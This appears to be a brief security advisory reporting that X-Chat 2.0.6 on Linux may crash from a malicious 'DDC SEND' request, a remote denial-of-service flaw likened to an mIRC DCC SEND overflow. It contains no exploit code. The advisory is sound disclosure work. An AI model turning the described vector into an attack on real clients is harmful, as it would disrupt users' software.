It has been reported that X-Chat may be prone to a remote denial of service vulnerability that may allow an attacker to crash the client by sending a malicious 'DDC SEND' request.

X-Chat version 2.0.6 running on a Linux platform has been reported to be affected by this issue resulting in a crash. Although unconfirmed, it is possible that other versions are affected as well. This issue is similar to mIRC DCC SEND Buffer Overflow Vulnerability
